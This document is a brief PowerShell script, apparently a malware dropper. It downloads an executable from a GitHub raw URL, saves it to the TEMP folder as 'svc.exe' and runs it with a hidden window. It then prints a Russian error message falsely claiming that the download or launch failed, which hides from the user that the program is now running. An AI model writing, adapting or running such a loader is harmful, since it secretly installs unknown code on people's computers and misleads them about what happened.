$url = «https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe»
$path = «$env:TEMP\svc.exe»
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host «Ошибка: Загрузка не удалась или запуск не удался.» -ForegroundColor Red
